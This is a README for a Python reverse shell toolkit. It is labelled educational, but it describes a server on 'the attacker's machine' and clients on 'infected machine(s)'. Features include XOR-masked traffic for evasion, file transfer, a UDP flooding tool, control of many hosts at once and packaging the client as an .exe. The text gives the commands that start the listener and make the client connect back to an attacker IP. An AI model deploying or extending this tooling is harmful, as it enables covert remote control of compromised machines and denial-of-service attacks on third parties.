# reverse_shell
> A reverse shell 

DISCLAIMER: This software is provided for educational purposes and as a proof of concept. The developer(s) do not endorse, incite or in any other way support unauthorised computer access and networks disruption.

NOTE : As of v0.0.3 folder `min` has been added. Since the new version has many more features not essential to the main functionality (a reverse shell that is), min will not recieve any more features beyond v0.0.3 and will only get bug and performance related fixes.

## Features

* Remote Command Execution
* Trafic masking (XORed insted of cleartext); for better results use port 443[1]
* Built-in File/Binary transfer (both ways) over the masked trafic
* Built-in UDP Flooding tool
* Multiple/All Hosts management; order File/Binary transfer and UDP Flood from Multiple/All connected Hosts
* Client script is tested and is compatible with PyInstaller (can be made into .exe)[2]

*[1]The idea for XORing as well as the skeleton for the client came from [primalsecurity.net](http://www.primalsecurity.net) so if you like this pack of scripts you'll probably love what they do

*[2]Again check [primalsecurity.net's](http://www.primalsecurity.net) perfect blogpost about producing an .exe

## Deployment:

* `rev_shell_server.py` or `rev_shell_server_min.py` is situated at the attacker's machine and running to accept connections
* `rev_shell_client.py` or `rev_shell_client_min.py` is situated in the infected machine(s) and will initiate the connection and wait for input. 

## Execution:

* Server:
```sh
  python rev_shell_server.py (max_connections) 
```
max_connections defaults to 5 if left blank

* Client: 
```sh
python rev_shell_client.py server_ip
```

Many changes can be made to fit individual needs.

As always if you have any suggestion, bug report or complain feel free to contact me.

## Todo

* Fix logic bug where if a dirrect command to Host OS has no output Server displays command not recognised
* Fix logic bug where if a dirrect command's to Host OS execution is perpetual the Server deadlocks

## License

MIT
